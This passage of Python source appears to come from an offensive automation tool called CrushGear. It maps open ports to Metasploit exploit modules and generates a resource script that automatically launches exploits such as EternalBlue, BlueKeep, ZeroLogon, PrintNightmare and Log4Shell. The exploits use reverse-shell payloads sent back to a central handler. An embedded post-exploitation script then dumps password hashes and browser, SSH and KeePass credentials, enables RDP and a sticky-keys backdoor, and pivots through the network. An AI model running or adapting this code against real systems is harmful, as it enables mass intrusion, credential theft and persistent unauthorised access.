    # ── Tomcat / JBoss / Jenkins / Struts (8080) ─────────────────────────────
    8080: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "8080"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "8080"}},
        {"m": "auxiliary/scanner/http/options",                "x": {"RPORT": "8080"}},
        {"m": "auxiliary/scanner/http/tomcat_mgr_login",       "x": {"RPORT": "8080"}},
        {"m": "auxiliary/scanner/http/tomcat_enum",            "x": {"RPORT": "8080"}},
        {"m": "auxiliary/scanner/http/jboss_vulnscan",         "x": {"RPORT": "8080"}},
        {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "8080"}, "cred": True},
        {"m": "exploit/multi/http/tomcat_mgr_upload",          "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "cred": True, "post": True},
        {"m": "exploit/multi/http/tomcat_jsp_upload_bypass",   "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/tomcat_ghostcat",            "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/jboss_maindeployer",         "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/jboss_invoke_deploy",        "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/jboss_seam_upload_exec",     "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/jenkins_script_console",     "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/glassfish_deployer",         "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/struts2_content_type_ognl",  "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/struts2_namespace_ognl",     "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
        {"m": "exploit/multi/http/log4shell_header_injection",  "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8080"}, "post": True},
    ],

    # ── HTTPS alt (8443) ──────────────────────────────────────────────────────
    8443: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "8443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "8443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/tomcat_mgr_login",       "x": {"RPORT": "8443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "8443", "SSL": "true"}, "cred": True},
        {"m": "auxiliary/scanner/ssl/openssl_heartbleed",      "x": {"RPORT": "8443"}},
        {"m": "auxiliary/scanner/ssl/openssl_ccs",             "x": {"RPORT": "8443"}},
        {"m": "exploit/multi/http/tomcat_mgr_upload",          "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8443", "SSL": "true"}, "cred": True, "post": True},
    ],

    # ── Alternate HTTP (8000) ─────────────────────────────────────────────────
    8000: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "8000"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "8000"}},
        {"m": "auxiliary/scanner/http/options",                "x": {"RPORT": "8000"}},
        {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "8000"}, "cred": True},
    ],

    # ── Jupyter Notebook (8888) ───────────────────────────────────────────────
    8888: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "8888"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "8888"}},
        {"m": "exploit/multi/misc/jupyter_notebook_exec",      "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "8888"}, "post": True},
    ],

    # ── Apache Solr (8983) ────────────────────────────────────────────────────
    8983: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "8983"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "8983"}},
        {"m": "exploit/multi/http/solr_velocity_rce",          "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "8983"}, "post": True},
    ],

    # ── Prometheus (9090) ─────────────────────────────────────────────────────
    9090: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "9090"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "9090"}},
    ],

    # ── Portainer / Misc (9000) ───────────────────────────────────────────────
    9000: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "9000"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "9000"}},
        {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "9000"}, "cred": True},
    ],

    # ── Elasticsearch (9200) ─────────────────────────────────────────────────
    9200: [
        {"m": "auxiliary/scanner/elastic/elastic_rest",        "x": {"RPORT": "9200"}},
        {"m": "exploit/multi/elasticsearch/script_mvel_rce",   "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "9200"}, "post": True},
        {"m": "exploit/multi/elasticsearch/script_groovy_rce", "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "9200"}, "post": True},
    ],

    # ── Webmin (10000) ────────────────────────────────────────────────────────
    10000: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "10000"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "10000"}},
        {"m": "exploit/unix/webapp/webmin_upload_exec",        "p": "cmd/unix/interact",
         "x": {"RPORT": "10000"}, "cred": True, "post": True},
        {"m": "exploit/unix/webapp/webmin_show_cgi_exec",      "p": "cmd/unix/interact",
         "x": {"RPORT": "10000"}, "cred": True, "post": True},
        {"m": "exploit/linux/http/webmin_backdoor",            "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "10000"}, "post": True},
    ],

    # ── Memcached (11211) ─────────────────────────────────────────────────────
    11211: [
        {"m": "auxiliary/scanner/memcached/memcached_amp"},
        {"m": "auxiliary/gather/memcached_extractor"},
    ],

    # ── RabbitMQ Management (15672) ───────────────────────────────────────────
    15672: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "15672"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "15672"}},
        {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "15672"}, "cred": True},
    ],

    # ── MongoDB (27017) ───────────────────────────────────────────────────────
    27017: [
        {"m": "auxiliary/scanner/mongodb/mongodb_login",
         "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
        {"m": "auxiliary/gather/mongodb_js_inject_collection_enum", "cred": True},
    ],

    # ── LDAP SSL (636) ────────────────────────────────────────────────────────
    636: [
        {"m": "auxiliary/scanner/ldap/ldap_login",             "x": {"RPORT": "636", "SSL": "true"}, "cred": True},
    ],

    # ── IPMI (623) ────────────────────────────────────────────────────────────
    623: [
        {"m": "auxiliary/scanner/ipmi/ipmi_version"},
        {"m": "auxiliary/scanner/ipmi/ipmi_cipher_zero"},
        {"m": "auxiliary/scanner/ipmi/ipmi_dumphashes"},
    ],

    # ── Rsync (873) ───────────────────────────────────────────────────────────
    873: [
        {"m": "auxiliary/scanner/rsync/modules_list"},
        {"m": "auxiliary/scanner/rsync/module_login",          "cred": True},
    ],

    # ── rExec / rLogin / rsh (512/513/514) ────────────────────────────────────
    512: [{"m": "auxiliary/scanner/rservices/rexec_login",     "cred": True}],
    513: [{"m": "auxiliary/scanner/rservices/rlogin_login",    "cred": True}],
    514: [{"m": "auxiliary/scanner/rservices/rsh_login",       "cred": True}],

    # ── Consul HTTP API (8500) ────────────────────────────────────────────────
    8500: [
        {"m": "exploit/multi/http/consul_rexec_exec",          "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "8500"}, "post": True},
    ],

    # ── Hadoop YARN ResourceManager (8088) ───────────────────────────────────
    8088: [
        {"m": "exploit/multi/http/hadoop_yarn_rce",            "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "8088"}, "post": True},
    ],

    # ── Kubernetes API (6443) ─────────────────────────────────────────────────
    6443: [
        {"m": "auxiliary/scanner/http/kubernetes_api",         "x": {"RPORT": "6443", "SSL": "true"}},
    ],

    # ── Cassandra (9042) ─────────────────────────────────────────────────────
    9042: [
        {"m": "auxiliary/scanner/cassandra/cassandra_login",   "cred": True},
    ],

    # ── AJP / Ghostcat (8009) ─────────────────────────────────────────────────
    8009: [
        {"m": "exploit/multi/http/tomcat_ghostcat",            "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "8009"}, "post": True},
    ],

    # ── LDAP (port 47001 — Windows RPC-over-HTTP) ────────────────────────────
    47001: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "47001"}},
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# Metasploit RC script builder
# ─────────────────────────────────────────────────────────────────────────────

# Post-exploitation commands written to a separate RC that AutoRunScript invokes
POST_EXPLOIT_RC = """\
# --- CrushGear Auto Post-Exploitation ---
# --- System Info ---
sysinfo
getuid
# --- Privilege Escalation ---
getsystem
run post/multi/recon/local_exploit_suggester
# --- Credential Harvesting ---
hashdump
run post/windows/gather/smart_hashdump
run post/windows/gather/credentials/credential_collector
run post/windows/gather/credentials/windows_secrets_dump
run post/multi/gather/ssh_creds
run post/multi/gather/firefox_creds
run post/windows/gather/credentials/kdbx
# --- Active Directory Enumeration ---
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_applications
run post/windows/gather/enum_patches
run post/multi/gather/env
# --- Network Discovery from Inside ---
run post/windows/gather/arp_scanner
run post/multi/manage/autoroute
# --- Persistence / Pivoting ---
run post/windows/manage/enable_rdp
run post/windows/manage/sticky_keys
# --- Upgrade Shell ---
run post/multi/manage/shell_to_meterpreter
background
"""


def build_msf_rc(
    rhosts: str,
    nuclei_findings: list[dict],
    nmap_data: dict | None = None,
    lhost: str = "0.0.0.0",
    lport: int = 4444,
    extra_cve_map: dict | None = None,
    username: str = "",
    password: str = "",
) -> tuple[str, str]:
    """
    Build:
      1. Main RC script (baseline + service-specific + OS-aware Windows/AD exploits + CVE-driven)
      2. Post-exploitation RC script (run after session opens)

    Returns: (main_rc_content, post_rc_path)
    extra_cve_map: additional CVE→MSF entries discovered by --update-cves
    """
    import tempfile, os
    post_rc_fd, post_rc_path = tempfile.mkstemp(prefix="crushgear_post_", suffix=".rc")
    os.close(post_rc_fd)
    # Write post-exploit commands to the temp file
    Path(post_rc_path).write_text(POST_EXPLOIT_RC)

    lines: list[str] = [
        "# CrushGear - Auto-generated Metasploit Resource Script",
        f"# Target: {rhosts}",
        "",
        f"setg LHOST {lhost}",
        f"setg LPORT {lport}",
        "",
        # Start a generic multi/handler first so reverse shells from any exploit
        # land immediately without needing a separate listener process.
        "# === Persistent Reverse Shell Handler ===",
        "use exploit/multi/handler",
        # generic/shell_reverse_tcp catches sessions from ALL OS (Linux, Windows, macOS)
        # Individual exploits use DisablePayloadHandler true to avoid port 4444 conflict
        "set PAYLOAD generic/shell_reverse_tcp",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set ExitOnSession false",       # keep handler alive for multiple sessions
        f"set AutoRunScript multi_console_command -rc {post_rc_path}",
        "run -j -z",                     # background and don't interact on new session
        "",
    ]

    def add_module(
        module: str,
        target_hosts: str = rhosts,
        payload: str | None = None,
        extra: dict | None = None,
        post_exploit: bool = False,
    ):
        lines.append(f"use {module}")
        lines.append(f"set RHOSTS {target_hosts}")
        if payload:
            lines.append(f"set PAYLOAD {payload}")
            # Prevent each exploit from trying to bind its own handler on the same port.
            # All reverse shells are routed through the central multi/handler above.
            lines.append("set DisablePayloadHandler true")
        if post_exploit and payload:
            lines.append(f"set AutoRunScript multi_console_command -rc {post_rc_path}")
        if extra:
            for k, v in extra.items():
                lines.append(f"set {k} {v}")
        lines.append("run -j")
        lines.append("")

    # ── Derive host groups from nmap data ─────────────────────────────
    all_ports:    set[int]  = set()
    windows_hosts: list[str] = []
    winrm_hosts:  list[str] = []
    mssql_hosts:  list[str] = []
    ldap_hosts:   list[str] = []
    dc_hosts:     list[str] = []
    dcerpc_hosts: list[str] = []

    if nmap_data:
        for d in nmap_data.values():
            all_ports.update(d.get("ports", []))
        windows_hosts = get_windows_hosts(nmap_data)
        winrm_hosts   = get_winrm_hosts(nmap_data)
        mssql_hosts   = get_mssql_hosts(nmap_data)
        ldap_hosts    = get_ldap_hosts(nmap_data)
        dc_hosts      = get_dc_hosts(nmap_data)
        dcerpc_hosts  = get_dcerpc_hosts(nmap_data)

    def _h(hosts: list[str]) -> str:
        """Return space-joined IPs, or fall back to the full rhosts string."""
        return " ".join(hosts) if hosts else rhosts

    # ── Baseline scanners (always run) ────────────────────────────────
    lines.append("# === Baseline Scanners ===")
    add_module("auxiliary/scanner/portscan/tcp",
               extra={"PORTS": "21,22,23,25,53,80,88,110,135,139,143,"
                               "389,443,445,464,593,636,1433,3268,3269,"
                               "3389,5985,5986,8080,8443,27017"})
    # SMB baseline: only run if port 445 is actually open (avoid timeout noise)
    # smb_lookupsid skipped — has MSF 6.4 NoMethodError bug (String vs Array)
    if 445 in all_ports:
        add_module("auxiliary/scanner/smb/smb_ms17_010")
        add_module("auxiliary/scanner/smb/smb_version")
        add_module("auxiliary/scanner/smb/smb_enumshares")
        add_module("auxiliary/scanner/smb/smb_enumusers")

    # ── PORT_TO_MODULES: run ALL relevant MSF modules per open port ───────────
    # For every port detected open by nmap, iterate the full module list and
    # queue each entry. Credentials are injected when "cred" flag is set.
    # Exploit modules (with payload) auto-attach post-exploit RC.
    lines.append("# === Per-Port Module Coverage (all open ports) ===")

    _port_done: set[tuple] = set()   # (port, module) dedup

    for port, mod_list in sorted(PORT_TO_MODULES.items()):
        if port not in all_ports:
            continue

        # Collect IPs that have this specific port open
        if nmap_data:
            port_hosts = [ip for ip, d in nmap_data.items()
                          if port in d.get("ports", [])]
        else:
            port_hosts = []
        t_hosts = _h(port_hosts)

        lines.append(f"# -- Port {port} --")
        for entry in mod_list:
            mod  = entry["m"]
            key  = (port, mod)
            if key in _port_done:
                continue
            _port_done.add(key)

            # Start with all hosts that have this port open, then narrow by filters.
            entry_hosts = list(port_hosts)

            # ── Filter 1: OS filter ────────────────────────────────────────────────
            # "os": "linux"   → only run against hosts NOT detected as Windows
            # "os": "windows" → only run against hosts detected as Windows
            required_os = entry.get("os")
            if required_os and nmap_data:
                if required_os == "linux":
                    entry_hosts = [ip for ip in entry_hosts if ip not in windows_hosts]
                elif required_os == "windows":
                    entry_hosts = [ip for ip in entry_hosts if ip in windows_hosts]
                if not entry_hosts:
                    continue   # No hosts match required OS — skip this module

            # ── Filter 2: Version/banner match ────────────────────────────────────
            # "ver": "vsftpd 2.3.4" → only run if nmap product for this port
            # contains the specified substring (case-insensitive)
            ver_match = entry.get("ver")
            if ver_match and nmap_data:
                entry_hosts = [
                    ip for ip in entry_hosts
                    if ver_match.lower() in
                       nmap_data.get(ip, {}).get("products", {}).get(port, "").lower()
                ]
                if not entry_hosts:
                    continue   # Banner doesn't match — skip version-specific exploit

            # ── Filter 3: Explicit credentials required ───────────────────────────
            # "needs_creds": True → skip module if no --username provided via CLI.
            # Prevents post-auth modules from running when no valid creds are known.
            if entry.get("needs_creds") and not username:
                continue

            t_hosts     = _h(entry_hosts)
            payload     = entry.get("p")
            extra_opts  = dict(entry.get("x") or {})
            inject_cred = entry.get("cred", False)
            do_post     = entry.get("post", False) and bool(payload)

            # Inject credentials when provided and module supports it.
            # CLI creds always override any defaults set in "x" dict.
            # If no CLI creds, defaults from "x" dict are used (e.g. root/"" for MySQL).
            if inject_cred and username:
                extra_opts["USERNAME"] = username
                extra_opts["PASSWORD"] = password

            add_module(
                mod,
                target_hosts=t_hosts,
                payload=payload,
                extra=extra_opts if extra_opts else None,
                post_exploit=do_post,
            )

    # ── Windows / Active Directory Exploit Probes ─────────────────────
    # Targeted exploit attempts driven by detected OS + open ports.
    # Runs even without nuclei CVE findings — covers Windows Server 2019,
    # Domain Controllers, MSSQL, WinRM, IIS, and RDP attack surfaces.
    if windows_hosts or dc_hosts:
        lines.append("# === Windows / Active Directory Exploit Probes ===")
        _win_done: set[str] = set()

        def add_win(
            module: str,
            hosts: list[str],
            payload: str | None = None,
            extra: dict | None = None,
            post: bool = False,
        ):
            """Add Windows-specific exploit, skipping duplicates within this section."""
            if module in _win_done:
                return
            _win_done.add(module)
            add_module(module, target_hosts=_h(hosts),
                       payload=payload, extra=extra, post_exploit=post)

        # --- Domain Controller attacks (Kerberos + LDAP combo = DC) ---
        if dc_hosts:
            lines.append("# -- Domain Controller Attacks --")
            # ZeroLogon — unauthenticated DC account takeover
            add_win("auxiliary/admin/dcerpc/cve_2020_1472_zerologon", dc_hosts)
            # PetitPotam — unauthenticated NTLM relay coerce via LSARPC
            add_win("auxiliary/admin/dcerpc/cve_2021_36942_petnightmare", dc_hosts)
            # Certifried — ADCS privilege escalation (CVE-2022-26923)
            add_win("auxiliary/admin/dcerpc/cve_2022_26923_certifried", dc_hosts)
            # MS14-068 — Kerberos privilege escalation (older DCs)
            add_win("auxiliary/admin/kerberos/ms14_068_kerberos_checksum", dc_hosts,
                    extra={"DOMAIN": "", "USER": username or "Guest"})

        # --- Windows SMB exploits ---
        win_smb = [ip for ip in (windows_hosts or list((nmap_data or {}).keys()))
                   if nmap_data and 445 in nmap_data.get(ip, {}).get("ports", [])]
        if win_smb:
            lines.append("# -- Windows SMB Exploits --")
            # EternalBlue (MS17-010) — unpatched Windows SMB RCE
            add_win("exploit/windows/smb/ms17_010_eternalblue", win_smb,
                    payload="windows/x64/meterpreter/reverse_tcp", post=True)
            # EternalRomance / PSExec variant
            add_win("exploit/windows/smb/ms17_010_psexec", win_smb,
                    payload="windows/x64/meterpreter/reverse_tcp", post=True)
            # PrintNightmare — remote print spooler RCE (CVE-2021-1675)
            add_win("exploit/windows/smb/cve_2021_1675_printspooler", win_smb,
                    payload="windows/x64/meterpreter/reverse_tcp",
                    extra={"SMBUSER": username or "", "SMBPASS": password or ""},
                    post=True)
            if username and password:
                # PSExec with valid credentials (service-based RCE)
                add_win("exploit/windows/smb/psexec", win_smb,
                        payload="windows/x64/meterpreter/reverse_tcp",
                        extra={"SMBUser": username, "SMBPass": password},
                        post=True)

        # --- MSSQL code execution (explicit credentials required) ---
        # Only attempt exploitation if CLI --username is provided.
        # Without valid creds, mssql_payload and mssql_exec will fail.
        if mssql_hosts and username:
            lines.append("# -- MSSQL Exploitation --")
            add_win("exploit/windows/mssql/mssql_payload", mssql_hosts,
                    payload="windows/x64/meterpreter/reverse_tcp",
                    extra={"USERNAME": username, "PASSWORD": password},
                    post=True)
            add_win("auxiliary/admin/mssql/mssql_exec", mssql_hosts,
                    extra={"USERNAME": username, "PASSWORD": password,
                           "CMD": "whoami /all"})

        # --- WinRM — PowerShell Remoting RCE (port 5985/5986) ---
        if winrm_hosts and username and password:
            lines.append("# -- WinRM Exploitation --")
            add_win("exploit/windows/winrm/winrm_script_exec", winrm_hosts,
                    payload="windows/x64/meterpreter/reverse_tcp",
                    extra={"USERNAME": username, "PASSWORD": password,
                           "FORCE_VBS": "true"},
                    post=True)

        # --- IIS / Windows web server attacks ---
        win_web = [ip for ip in (windows_hosts or [])
                   if nmap_data and
                   {80, 443, 8080, 8443} & set(nmap_data.get(ip, {}).get("ports", []))]
        if win_web:
            lines.append("# -- IIS / Windows Web Exploits --")
            # WebDAV buffer overflow (CVE-2017-7269 — IIS 6.0)
            add_win("exploit/windows/iis/iis_webdav_scstoragepathfromurl", win_web,
                    payload="windows/meterpreter/reverse_tcp", post=True)
            # NTLM challenge reveal — extract domain info from IIS NTLM auth
            add_win("auxiliary/scanner/http/ntlm_info_enumeration", win_web,
                    extra={"RPORT": "80"})

        # --- RDP exploitation (BlueKeep — CVE-2019-0708) ---
        win_rdp = [ip for ip in (windows_hosts or [])
                   if nmap_data and 3389 in nmap_data.get(ip, {}).get("ports", [])]
        if win_rdp:
            lines.append("# -- RDP Exploits (BlueKeep / DejaBlue) --")
            add_win("exploit/windows/rdp/cve_2019_0708_bluekeep_rce", win_rdp,
                    payload="windows/x64/meterpreter/reverse_tcp", post=True)
            add_win("exploit/windows/rdp/cve_2019_1182_dejablue", win_rdp,
                    payload="windows/x64/meterpreter/reverse_tcp", post=True)

        # --- Windows local privilege escalation (post-session) ---
        if windows_hosts:
            lines.append("# -- Windows Local Privilege Escalation --")
            # MS16-032 — Secondary Logon Handle privilege escalation
            add_win("exploit/windows/local/ms16_032_secondary_logon_handle_privesc",
                    windows_hosts, payload="windows/x64/meterpreter/reverse_tcp", post=True)
            # Hot Potato — token impersonation (works on older Windows)
            add_win("exploit/windows/local/ms16_075_reflection_juicy",
                    windows_hosts, payload="windows/x64/meterpreter/reverse_tcp", post=True)

    # ── Linux-specific exploit probes ────────────────────────────────
    linux_hosts: list[str] = []
    if nmap_data:
        linux_hosts = [
            ip for ip, d in nmap_data.items()
            if "linux" in d.get("os_guess", "").lower()
            or (22 in d.get("ports", []) and not any(
                k in d.get("os_guess", "").lower()
                for k in ("windows", "microsoft")
            ))
        ]
    if linux_hosts:
        lines.append("# === Linux / Unix Exploit Probes ===")
        _lh = _h(linux_hosts)
        # Shellshock (CVE-2014-6271) — bash env via CGI, only on Apache servers
        _web_ports = (80, 443, 8080, 8443)
        _apache_linux = [
            ip for ip in linux_hosts
            if nmap_data and any(
                "apache" in nmap_data.get(ip, {}).get("products", {}).get(p, "").lower()
                for p in _web_ports
            )
        ]
        if _apache_linux:
            add_module("exploit/multi/http/apache_mod_cgi_bash_env_exec",
                       target_hosts=_h(_apache_linux),
                       payload="linux/x86/meterpreter/reverse_tcp",
                       extra={"TARGETURI": "/cgi-bin/test.cgi"},
                       post_exploit=True)
        # Samba (CVE-2017-7494 — SambaCry) and CVE-2007-2447
        _smb_linux = [ip for ip in linux_hosts
                      if nmap_data and 445 in nmap_data.get(ip, {}).get("ports", [])]
        if _smb_linux:
            add_module("exploit/linux/samba/is_known_pipename",
                       target_hosts=_h(_smb_linux),
                       payload="linux/x86/meterpreter/reverse_tcp",
                       post_exploit=True)
            add_module("exploit/multi/samba/usermap_script",
                       target_hosts=_h(_smb_linux),
                       payload="cmd/unix/interact")
        # OpenSSH regreSSHion (CVE-2024-6387)
        _ssh_linux = [ip for ip in linux_hosts
                      if nmap_data and 22 in nmap_data.get(ip, {}).get("ports", [])]
        if _ssh_linux:
            add_module("exploit/linux/ssh/openssh_regresshion",
                       target_hosts=_h(_ssh_linux),
                       payload="linux/x64/meterpreter/reverse_tcp",
                       post_exploit=True)

    # ── CVE-driven exploit modules from nuclei findings ─────────────
    # Merge static map with any auto-discovered entries
    active_cve_map = dict(CVE_TO_MSF)
    if extra_cve_map:
        active_cve_map.update(extra_cve_map)

    if nuclei_findings:
        lines.append("# === CVE-Driven Exploits (from Nuclei findings) ===")
        added_modules: set[str] = set()
        for finding in nuclei_findings:
            cve = finding.get("cve", "")
            host = finding.get("host", rhosts)
            # Normalize: strip port / path from host if needed
            if "://" in host:
                from urllib.parse import urlparse
                host = urlparse(host).hostname or host
            msf_info = active_cve_map.get(cve)
            if not msf_info:
                continue
            module = msf_info["module"]
            if module in added_modules:
                continue
            added_modules.add(module)
            payload = msf_info.get("payload")
            lines.append(f"# Auto-added: {cve} detected on {host}")
            add_module(
                module,
                target_hosts=host,
                payload=payload,
                post_exploit=bool(payload),
            )

    lines.append("# === Finish ===")
    lines.append("jobs -l")
    # Scanners against /24 subnets need 90-120s to complete.
    # Without this wait, msfconsole exits before background jobs finish
    # and reverse-shell sessions never get a chance to connect back.
    lines.append("sleep 120")
    lines.append("jobs -l")
    lines.append("sessions -l")
    lines.append("exit")

    return "\n".join(lines), post_rc_path


def collect_all_feed(output_dir: Path) -> dict:
    """Collect all available feed data from all phase outputs."""
    nmap_data = parse_nmap(output_dir)
    return {
        "nmap":          nmap_data,
        "hosts":         parse_amass(output_dir) or get_all_hosts(nmap_data),
        "smb_hosts":           get_smb_hosts(nmap_data),
        "web_hosts":           get_web_hosts(nmap_data),
        "rdp_hosts":           get_rdp_hosts(nmap_data),
        "ssh_hosts":           get_ssh_hosts(nmap_data),
        "winrm_hosts":         get_winrm_hosts(nmap_data),
        "mssql_hosts":         get_mssql_hosts(nmap_data),
        "ldap_hosts":          get_ldap_hosts(nmap_data),
        "dc_hosts":            get_dc_hosts(nmap_data),
        "windows_hosts":       get_windows_hosts(nmap_data),
        "vnc_hosts":           get_vnc_hosts(nmap_data),
        "oracle_hosts":        get_oracle_hosts(nmap_data),
        "elasticsearch_hosts": get_elasticsearch_hosts(nmap_data),
        "docker_hosts":        get_docker_hosts(nmap_data),
        "kubernetes_hosts":    get_kubernetes_hosts(nmap_data),
        "solr_hosts":          get_solr_hosts(nmap_data),
        "hadoop_hosts":        get_hadoop_hosts(nmap_data),
        "urls":                parse_httpx(output_dir) or get_web_urls(nmap_data),
        "findings":            parse_nuclei(output_dir),
    }
